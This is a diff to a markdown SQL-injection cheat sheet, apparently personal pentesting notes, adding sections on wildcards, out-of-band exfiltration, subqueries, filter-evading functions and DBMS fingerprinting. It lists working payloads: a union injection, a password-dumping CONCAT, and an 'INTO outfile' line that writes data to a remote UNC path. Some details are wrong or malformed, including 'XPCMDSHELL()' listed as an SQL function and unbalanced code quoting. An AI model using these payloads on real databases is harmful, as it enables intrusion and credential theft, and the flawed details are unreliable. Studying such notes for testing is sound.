@@ -25,10 +25,41 @@ ie `x' or '1'='1`
 
 > SELECT * FROM users WHERE password = ' `x' or '1'='1` '
 
+## Note
+
+Do not DOS!  
+
+Limit the amount of data you fetch, as you may accidentally perform a Denial of Service.  
+
 ## Techniques
 
 * Add your own string escapes to your string to break the code
 * Add comments (`--`) after the string escape to disable other parts of the SQL query
+
+## Wildcards
+
+`SELECT * FROM users WHERE username LIKE 'admi%';
+
+`SELECT TOP 10 * FROM Articles WHERE Content LIKE '%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}£$&N%_)$*£()$*R"_)][%](%[x])%a][$*"£$-9]_%'`
+
+## OOB - Out of Band Injection
+
+_When the attacker is unable to use the same channel to both launch and gather results_
+
+Sometimes we may have to perform a blind injection, and will be unable to gather verbose results.  
+(Or there maybe an outbound Web Application Firewall).  
+
+OOB injection relies on the dbms making a DNS/HTTP request to deliver data to an attacker
+
+i.e. MySQL
+
+* `select @@secure_file_priv`
+
+NULL -> Disabled  
+'/directory' -> Restricted import  
+Default of "" on MySQL < 5.5.53
+
+* `SELECT * INTO outfile '//192.168.1.1/url.txt'`
 
 ## OS-Interative Databases
 
@@ -38,6 +69,40 @@ If the database access files for ETL (extract, transform, load) operations, ther
 * `SELECT LOAD_FILE('/tmp/world') AS world;`
 
 It may even be possible to execute shell commands
+
+## Subquerying
+
+Make a query inside of a query
+
+* `Select * from users where isAdmin = (select isAdmin from permissions);`
+* `Select user,password from users where username='injectionpoint' union select (select permissions from users limit 1), 'asdf';`
+
+## Union by Copypaste
+
+Ehhh
+
+## SQL Functions
+
+* CHR()
+* CAST()
+* CONCAT()
+* XPCMDSHELL()
+
+These may help you to bypass WAFs/Filters, extract more content, bypass type constraints.  
+
+i.e. if 'admin' is blacklisted -> `CONCAT(chr(0x61), chr(0x64), ...)`
+
+i.e exfil information -> `SELECT CONCAT(username,"|",password)` FROM users`
+
+i.e to bypass type constraints -> `CAST(id as VARCHAR)`
+
+## Fingerprinting
+
+Which DBMS are we using?
+
+i.e. @@Version, Version(), sqlite_version()
+
+For boolean based injections, we could use `substr(version(), 1, 1)=5` to check if the server version is `5.xx`
 
 ## Probing for Vulnerabilities
 
